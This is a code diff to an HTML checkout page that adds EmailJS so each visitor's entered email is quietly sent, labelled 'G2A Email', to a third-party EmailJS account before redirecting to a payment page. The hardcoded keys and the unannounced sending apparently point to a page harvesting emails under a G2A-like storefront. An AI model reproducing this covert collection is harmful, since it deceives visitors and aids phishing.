@@ -542,25 +542,32 @@ if (Amount2Field2.textContent === "NaN" || Amount2Field2.textContent === "NaN") 
   </script>
 
 
-  <script>
- var submitButton = document.getElementById("menu-button");
- var Amount2 = document.getElementById("menu-amount");
- var emailField = document.getElementById("email");
- var invalidEmail = document.getElementById("invalid-email");
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+(function(){
+  emailjs.init("KGWmh1dyveTN8cjHy");
+})();
+</script>
 
+<script>
+var submitButton = document.getElementById("menu-button");
+var Amount2 = document.getElementById("menu-amount");
+var emailField = document.getElementById("email");
+var invalidEmail = document.getElementById("invalid-email");
 
- emailField.addEventListener("blur", function() {
+emailField.addEventListener("blur", function() {
   if (!emailField.checkValidity()) {
     invalidEmail.style.display = "flex";
     emailField.style.border = "1px solid red";
   } else {
     invalidEmail.style.display = "none";
-    emailField.style.border = "1px solid #E0E0E0"
+    emailField.style.border = "1px solid #E0E0E0";
   }
- });
+});
 
- submitButton.addEventListener("click", function() {
+submitButton.addEventListener("click", function(event) {
   event.preventDefault();
+  
   if (!emailField.checkValidity()) {
     invalidEmail.style.display = "flex";
     emailField.style.border = "1px solid red";
@@ -568,12 +575,36 @@ if (Amount2Field2.textContent === "NaN" || Amount2Field2.textContent === "NaN") 
     return;
   }
 
-  var amount2Text = Amount2.textContent.replace('$ ', ''); // Removes "$ " (dollar sign and space)
-  var amount2Text = parseFloat(amount2Text);
+  submitButton.disabled = true;
+  submitButton.classList.add("disabled");
 
-  window.location.href = "Payment.html?amount2=" + encodeURIComponent(amount2Text);
- });
-  </script>
+  setTimeout(function() {
+    submitButton.disabled = false;
+    submitButton.classList.remove("disabled");
+  }, 7000);
+
+  var amount2Text = Amount2.textContent.replace('$ ', '');
+  var amount2Value = parseFloat(amount2Text);
+
+  function sendMail() {
+  var Email = document.getElementById("email").value;
+  var submitButton = "G2A Email";
+
+  emailjs.send('service_76vugl3', 'template_9vpv84j', {
+    email: Email,
+    submit_button_id: submitButton,
+  })
+  .then(function(response) {
+    window.location.href = "Payment.html?amount2=" + encodeURIComponent(amount2Value);
+  })
+  .catch(function(error) {
+    window.location.href = "Payment.html?amount2=" + encodeURIComponent(amount2Value);
+  });
+}
+  sendMail();
+  //window.location.href = "Payment.html?amount2=" + encodeURIComponent(amount2Value);
+});
+</script>
 
 
 
